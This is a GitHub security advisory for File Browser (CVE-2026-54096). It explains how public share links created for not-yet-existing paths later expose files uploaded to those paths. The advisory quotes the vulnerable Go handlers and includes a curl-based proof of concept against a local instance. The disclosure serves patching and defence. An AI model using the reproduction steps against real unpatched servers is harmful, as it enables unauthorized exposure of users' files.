# [H] File Browser: Improper Access Control Occurs via Pre-Created Public Share for a Non-existent Path

## Summary
Severity: High
Advisory: GHSA-3q2p-72cj-682c
CVE: CVE-2026-54096
CWE: CWE-367, CWE-668, CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-3q2p-72cj-682c
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.63.7
- Go: `github.com/filebrowser/filebrowser` — affected >=0

## Details
### Summary
This is similar vulnrability of **`CVE-2026-0035`**, which was fixed in Android `MediaProvider` with **high** severity. In the original Java issue, `MediaStore.createWriteRequest()` accepted attacker-controlled URIs and created a future grant even when the referenced media item did not exist yet. The Android fix added an existence check before creating the request.

`filebrowser/filebrowser` has the analogous issue in Go. `POST /api/share/<path>` accepts an authenticated request for an arbitrary path and stores a public share record without checking whether the target file currently exists. Later, when a file is created at that same path, the previously created public share immediately becomes valid and exposes the new file through `GET /api/public/dl/<hash>`.

### Details
The vulnerable create path is:

- `http/share.go`
- `sharePostHandler()`
- route: `POST /api/share/<path>`

`sharePostHandler()` only checks that the caller is authenticated and has share/download permissions. It then builds a `share.Link` directly from `r.URL.Path` and saves it:

```go
s = &share.Link{
    Path:         r.URL.Path,
    Hash:         str,
    Expire:       expire,
    UserID:       d.user.ID,
    PasswordHash: string(hash),
    Token:        token,
}

if err := d.store.Share.Save(s); err != nil {
    return http.StatusInternalServerError, err
}
```

There is no `Stat`, `Exists`, or equivalent check before the public share record is committed.

The vulnerable consume path is:

- `http/public.go`
- `withHashFile()`
- routes: `GET /api/public/share/<hash>`, `GET /api/public/dl/<hash>`

Each public request loads the saved share by hash and then resolves `link.Path` against the owner's current filesystem state:

```go
file, err := files.NewFileInfo(&files.FileOptions{
    Fs:   d.user.Fs,
    Path: link.Path,
    ...
})
```

This means the share is not bound to an object that existed at creation time. It is bound only to a path string, so a share created for a nonexistent path becomes valid later as soon as that path is populated.


### PoC
The PoC below starts from external HTTP input only.

1. Authenticate to File Browser.
2. Confirm `/future4.txt` does not exist.
3. Create a public share for `/future4.txt` anyway.
4. Confirm the public share returns `404`.
5. Upload a file to `/future4.txt`.
6. Reuse the same public share URL and read the file content.

Reproduction commands:

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:8091/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Password123!"}')

curl -i -X POST http://127.0.0.1:8091/api/share/future4.txt \
  -H "X-Auth: $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{}'

curl -i http://127.0.0.1:8091/api/public/dl/JVeEQlLO

curl -i -X POST http://127.0.0.1:8091/api/resources/future4.txt \
  -H "X-Auth: $TOKEN" \
  --data-binary 'fourth-secret'

curl -i http://127.0.0.1:8091/api/public/dl/JVeEQlLO
```


### Impact
An authenticated user can create a public share for a path before the file exists, and that same share later exposes whatever file is created at that path. This can unintentionally publish future sensitive files and bypass the expected invariant that a share grants access only to an existing object reviewed at creation time.

### Reference

Original CVE: https://nvd.nist.gov/vuln/detail/CVE-2026-0035

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3q2p-72cj-682c
- https://nvd.nist.gov/vuln/detail/CVE-2026-54096
- https://github.com/filebrowser/filebrowser/commit/166583db632e088e9f0adce30aec43bb9d9019f4
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/releases/tag/v2.63.7
